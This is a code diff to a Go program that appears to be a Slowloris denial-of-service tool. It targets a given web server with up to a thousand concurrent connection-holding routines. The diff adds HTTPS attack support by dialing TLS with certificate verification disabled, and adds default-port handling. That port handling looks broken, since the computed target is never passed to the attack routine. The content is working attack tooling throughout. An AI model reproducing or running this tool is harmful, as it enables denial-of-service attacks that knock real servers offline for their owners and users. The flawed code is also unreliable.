@@ -1,12 +1,14 @@
 package main
 
 import (
+	"crypto/tls"
 	"flag"
 	"fmt"
 	"math/rand"
 	"net"
 	"net/url"
 	"os"
+	"strings"
 	"sync"
 	"time"
 )
@@ -14,6 +16,7 @@ import (
 const timeOut = 3
 const sleep = 5
 
+var https bool
 var target = flag.String("t", "", "the ip address of the targeted machine")
 var routines = flag.Int("r", 1000, "the number of concurent routines")
 var wg sync.WaitGroup
@@ -30,8 +33,27 @@ func usage() {
 	fmt.Print("An example is -t http://195.17.56.213:8080 \n")
 	flag.PrintDefaults()
 }
+func createDial(target string) (net.Conn, error) {
+	var conn net.Conn
+	var err error
+
+	if https {
+		dial := net.Dialer{Timeout: timeOut * time.Second}
+		conf := tls.Config{InsecureSkipVerify: true}
+		conn, err = tls.DialWithDialer(&dial, "tcp", target, &conf)
+		if err != nil {
+			return nil, err
+		}
+	} else {
+		conn, err = net.DialTimeout("tcp", target, timeOut*time.Second)
+		if err != nil {
+			return nil, err
+		}
+	}
+	return conn, nil
+}
 func slowLoris(target string, indx int) {
-	conn, err := net.DialTimeout("tcp", target, timeOut*time.Second)
+	conn, err := createDial(target)
 	if err != nil {
 		fmt.Println(err.Error())
 		fmt.Printf("Couldn't connect to %s\n", target)
@@ -72,6 +94,19 @@ func main() {
 	}
 	fmt.Printf("Target: %s  Routines: %v\n", *target, *routines)
 	u, _ := url.Parse(*target)
+	target := u.Host
+	if u.Scheme == "http" {
+		https = false
+	} else {
+		https = true
+	}
+	if !strings.Contains(target, ":") {
+		if https {
+			target += ":443"
+		} else {
+			target += ":80"
+		}
+	}
 	for i := 1; i <= *routines; i++ {
 		wg.Add(1)
 		go slowLoris(u.Host, i)
